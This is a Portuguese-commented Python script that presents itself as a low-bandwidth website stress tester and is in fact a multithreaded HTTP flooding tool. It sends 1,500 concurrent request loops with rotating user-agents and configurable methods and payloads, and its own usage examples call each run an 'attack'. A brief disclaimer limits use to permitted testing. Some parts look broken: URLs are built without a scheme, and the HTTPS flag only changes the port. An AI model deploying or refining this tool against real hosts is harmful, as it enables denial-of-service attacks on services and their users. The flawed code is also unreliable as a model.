#!/usr/bin/env python3
import argparse
import logging
import random
import sys
import threading
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Configuração inicial de logging
logging.basicConfig(
    format="[%(asctime)s] %(message)s",
    datefmt="%d-%m-%Y %H:%M:%S",
    level=logging.INFO
)

# Função para imprimir instruções de uso
def imprimir_instrucoes():
    instrucoes = """
Instruções de Uso do Tomara que Caia:

python3 tomara_que_caia.py <host> [opções]

*** IMPORTANTE ***
Este script deve ser usado apenas para testes de estresse em sistemas para os quais você tem permissão explícita. 
O uso para realizar ataques de negação de serviço (DoS/DDoS) sem autorização é ilegal e antiético.

Argumentos Posicionais:
<host>                Host para realizar o teste de estresse

Opções:
-p, --porta           Porta do servidor web, geralmente 80 (default: 80)
-s, --sockets         Número de sockets a serem usados no teste (default: 1500)
-v, --verbose         Aumenta o nível de log
-ua, --randuseragents Aleatoriza os user-agents em cada requisição
-https                Usar HTTPS para as requisições
-sleeptime            Tempo de espera entre cada cabeçalho enviado (default: 15 segundos)
--method              Método de requisição (default: GET)
--headers             Cabeçalhos a serem enviados (default: None) no formato "Chave:Valor;Chave:Valor"
--params              Parâmetros de consulta a serem enviados (default: None) no formato "param1=valor1;param2=valor2"
--body                Corpo da requisição a ser enviado (default: None)

Exemplos de uso:
1. Ataque simples em um host:
   python3 tomara_que_caia.py example.com

2. Ataque em um host usando HTTPS e 200 sockets:
   python3 tomara_que_caia.py example.com -https -s 200

3. Ataque com cabeçalhos personalizados:
   python3 tomara_que_caia.py example.com --headers "Authorization:Bearer token;Custom-Header:Value"

4. Ataque com parâmetros de consulta:
   python3 tomara_que_caia.py example.com --params "param1=valor1;param2=valor2"

5. Ataque com corpo da requisição:
   python3 tomara_que_caia.py example.com --method POST --body '{"key":"value"}'
"""
    print(instrucoes)

# Parser de argumentos
parser = argparse.ArgumentParser(
    description="Tomara que Caia, ferramenta de teste de estresse de baixa largura de banda para sites",
    add_help=False
)
parser.add_argument("host", nargs="?", help="Host para realizar o teste de estresse")
parser.add_argument(
    "-p", "--porta", default=80, help="Porta do servidor web, geralmente 80", type=int
)
parser.add_argument(
    "-s",
    "--sockets",
    default=1500,  # Aumentado para 1500
    help="Número de sockets a serem usados no teste",
    type=int,
)
parser.add_argument(
    "-v",
    "--verbose",
    dest="verbose",
    action="store_true",
    help="Aumenta o nível de log",
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Aleatoriza os user-agents em cada requisição",
)
parser.add_argument(
    "-https",
    dest="https",
    action="store_true",
    help="Usar HTTPS para as requisições",
)
parser.add_argument(
    "-sleeptime",
    dest="sleeptime",
    default=15,
    type=int,
    help="Tempo de espera entre cada cabeçalho enviado.",
)
parser.add_argument(
    "--method",
    default="GET",
    help="Método de requisição (default: GET)",
)
parser.add_argument(
    "--headers",
    default=None,
    help="Cabeçalhos a serem enviados (default: None)",
)
parser.add_argument(
    "--params",
    default=None,
    help="Parâmetros de consulta a serem enviados (default: None)",
)
parser.add_argument(
    "--body",
    default=None,
    help="Corpo da requisição a ser enviado (default: None)",
)
parser.add_argument(
    "-h", "--help", action="help", default=argparse.SUPPRESS,
    help="Mostra esta mensagem de ajuda e sai"
)
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(https=False)
args = parser.parse_args()

# Verifica se foi fornecido um host
if not args.host:
    print("Host necessário!")
    imprimir_instrucoes()
    sys.exit(1)

# Lista de User-Agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/91.0.4472.164 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/94.0.4606.54 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/94.0.4606.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/95.0.4638.54 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/92.0.4515.131 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/94.0.4606.54 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/94.0.4606.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/95.0.4638.54 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, como Gecko) Chrome/95.0.4638.69 Safari/537.36"
]

# Definir se é HTTP ou HTTPS
port = 443 if args.https else args.porta

# Tempo de espera entre cada requisição
sleeptime = args.sleeptime

# Método de requisição
method = args.method.upper()

# Headers de requisição
headers = {}
if args.headers:
    header_pairs = args.headers.split(";")
    for pair in header_pairs:
        key, value = pair.split(":")
        headers[key.strip()] = value.strip()

# Parâmetros de consulta
params = {}
if args.params:
    param_pairs = args.params.split(";")
    for pair in param_pairs:
        key, value = pair.split("=")
        params[key.strip()] = value.strip()

# Corpo da requisição
body = args.body

# Função para realizar requisições HTTP
def realizar_requisicao():
    session = requests.Session()
    retry_strategy = Retry(
        total=10,  # Aumentado para 10 tentativas
        backoff_factor=0.5,  # Reduzido para 0.5 segundos de espera entre tentativas
        status_forcelist=[429, 500, 502, 503, 504],  # Status HTTP que irão acionar uma nova tentativa
        method_whitelist=["HEAD", "GET", "OPTIONS", "POST", "PUT", "DELETE"]  # Métodos HTTP que irão acionar uma nova tentativa
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    while True:
        try:
            if args.randuseragent:
                headers["User-Agent"] = random.choice(user_agents)

            if method == "GET":
                response = session.get(f"{args.host}:{port}", headers=headers, params=params)
            elif method == "POST":
                response = session.post(f"{args.host}:{port}", headers=headers, params=params, data=body)
            elif method == "PUT":
                response = session.put(f"{args.host}:{port}", headers=headers, params=params, data=body)
            elif method == "DELETE":
                response = session.delete(f"{args.host}:{port}", headers=headers, params=params)
            elif method == "OPTIONS":
                response = session.options(f"{args.host}:{port}", headers=headers, params=params)
            elif method == "HEAD":
                response = session.head(f"{args.host}:{port}", headers=headers, params=params)
            else:
                response = session.request(method, f"{args.host}:{port}", headers=headers, params=params, data=body)

            logging.info(f"Requisição {method} enviada para {args.host}:{port}, Status: {response.status_code}")
            
            # Espera para não sobrecarregar o servidor
            time.sleep(sleeptime)

        except requests.exceptions.RequestException as e:
            logging.error(f"Erro ao enviar requisição: {e}")

# Função principal
def main():
    threads = []
    for _ in range(args.sockets):
        thread = threading.Thread(target=realizar_requisicao)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    main()